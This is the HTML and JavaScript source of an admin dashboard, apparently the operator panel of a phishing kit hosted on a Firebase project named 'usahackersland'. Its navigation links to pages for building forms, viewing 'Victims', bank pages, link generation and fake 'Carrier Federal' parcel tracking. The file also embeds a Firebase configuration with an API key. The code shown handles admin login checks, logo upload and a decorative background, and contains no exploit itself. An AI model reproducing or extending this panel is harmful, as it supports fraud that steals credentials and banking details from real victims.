<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Admin Dashboard</title>
<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>

<style>
  html, body {
    margin: 0; padding: 0; height: 100%;
    font-family: Arial, sans-serif;
    color: white;
    overflow-x: hidden;
    position: relative;
    background: black;
  }
  #backgroundCanvas {
    position: fixed;
    top: 0; left: 0;
    width: 100vw; height: 100vh;
    z-index: 0;
    pointer-events: none;
    background: black;
  }
  .header {
    background: rgba(0,0,0,0.8);
    color: #0f0;
    padding: 10px;
    text-align: center;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 15px;
    position: relative;
    z-index: 10;
    font-family: monospace;
  }
  .header img {
    height: 50px;
  }
  .nav {
    background: rgba(0,0,0,0.8);
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    gap: 10px;
    padding: 10px;
    position: relative;
    z-index: 10;
    font-family: monospace;
  }
  .nav a {
    color: #0f0;
    text-decoration: none;
    font-weight: bold;
    background: rgba(0,0,0,0.6);
    padding: 8px 15px;
    border-radius: 5px;
    transition: background 0.3s ease;
  }
  .nav a:hover {
    background: rgba(0,255,0,0.3);
  }
  iframe {
    width: 100%;
    height: 70vh;
    border: none;
    position: relative;
    z-index: 10;
    background: #111;
  }
  .logo-upload {
    background: #111;
    padding: 10px;
    text-align: center;
    color: #0f0;
    position: relative;
    z-index: 10;
    max-width: 350px;
    margin: 20px auto;
    border-radius: 8px;
    font-family: monospace;
  }
  #logoutBtn {
    background: none;
    border: 1px solid #0f0;
    color: #0f0;
    cursor: pointer;
    font-family: monospace;
    padding: 5px 15px;
    border-radius: 5px;
    transition: background 0.3s ease;
  }
  #logoutBtn:hover {
    background: #0f0;
    color: black;
  }
</style>
</head>
<body>

<canvas id="backgroundCanvas"></canvas>

<div class="header">
  <img id="dashboardLogo" src="logo.png" alt="Logo" />
  <h1>ADMIN DASHBOARD</h1>
  <button id="logoutBtn">Logout</button>
</div>

<div class="logo-upload">
  <label>Upload Platform Logo:</label><br />
  <input type="file" id="logoInput" accept="image/*" />
</div>

<div class="nav">
  <a href="#" onclick="loadPage('form-builder')">üé® Form Builder</a>
  <a href="#" onclick="loadPage('forms')">üíæ Saved Forms</a>
  <a href="#" onclick="loadPage('feedback')">üìù Feedback</a>
  <a href="#" onclick="loadPage('victims')">üß† View Victims</a>
  <a href="#" onclick="loadPage('members')">üë• Members</a>
  <a href="#" onclick="loadPage('links')">üîó Links</a>
  <a href="#" onclick="loadPage('generate')">üßæ Generate</a>
  <a href="#" onclick="loadPage('bank')">üè¶ Bank</a>
  <a href="#" onclick="loadPage('tracking')">üì¶ Tracking (Carrier Federal)</a>
</div>

<iframe id="iframePage" src="Social-media-links/build.html"></iframe>

<script>
  // Initialize Firebase
  const firebaseConfig = {
    apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
    authDomain: "usahackersland.firebaseapp.com",
    projectId: "usahackersland",
    storageBucket: "usahackersland.appspot.com",
    messagingSenderId: "588407428267",
    appId: "1:588407428267:web:7c4898cbb62efd3d5953ee"
  };
  firebase.initializeApp(firebaseConfig);
  const auth = firebase.auth();
  const db = firebase.firestore();

  // Redirect if not logged in or not admin
  auth.onAuthStateChanged(async (user) => {
    if (!user) {
      window.location.href = "login.html"; // redirect to login page
      return;
    }
    try {
      const doc = await db.collection('users').doc(user.uid).get();
      if (!doc.exists || doc.data().role !== 'admin') {
        alert("Access denied. Admins only.");
        await auth.signOut();
        window.location.href = "login.html";
        return;
      }
    } catch (err) {
      console.error("Error checking user role:", err);
      alert("Error verifying user. Please login again.");
      await auth.signOut();
      window.location.href = "login.html";
      return;
    }
  });

  // Logout button
  document.getElementById('logoutBtn').addEventListener('click', () => {
    auth.signOut().then(() => {
      window.location.href = "login.html";
    });
  });

  // Logo upload & persistence via localStorage
  const logoInput = document.getElementById('logoInput');
  const dashboardLogo = document.getElementById('dashboardLogo');
  logoInput.addEventListener('change', e => {
    const file = e.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = e => {
      dashboardLogo.src = e.target.result;
      localStorage.setItem('platformLogo', e.target.result);
    };
    reader.readAsDataURL(file);
  });
  // Load saved logo
  const savedLogo = localStorage.getItem('platformLogo');
  if (savedLogo) {
    dashboardLogo.src = savedLogo;
  }

  // Navigation page loading
  const base = "Social-media-links/";
  function loadPage(page) {
    const iframe = document.getElementById('iframePage');
    const pages = {
      'form-builder': base + "build.html",
      'forms': base + "forms.html",
      'feedback': base + "feedback.html",
      'victims': base + "victims.html",
      'members': base + "members.html",
      'links': base + "links.html",
      'generate': base + "generate.html",
      'bank': base + "bank.html",
      'tracking': base + "tracking.html"
    };
    if(pages[page]) iframe.src = pages[page];
  }

  // MATRIX Background effect
  const canvas = document.getElementById('backgroundCanvas');
  const ctx = canvas.getContext('2d');
  let width, height;
  let animationFrameId;

  function resizeCanvas() {
    width = canvas.width = window.innerWidth;
    height = canvas.height = window.innerHeight;
  }
  window.addEventListener('resize', resizeCanvas);
  resizeCanvas();

  const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%';
  const fontSize = 16;
  let columns = Math.floor(width / fontSize);
  const drops = new Array(columns).fill(1);

  function draw() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
    ctx.fillRect(0, 0, width, height);

    ctx.fillStyle = '#0F0';
    ctx.font = fontSize + 'px monospace';

    for (let i = 0; i < drops.length; i++) {
      const text = letters.charAt(Math.floor(Math.random() * letters.length));
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);

      if (drops[i] * fontSize > height && Math.random() > 0.975) {
        drops[i] = 0;
      }

      drops[i]++;
    }
    animationFrameId = requestAnimationFrame(draw);
  }
  draw();

</script>

</body>
</html>
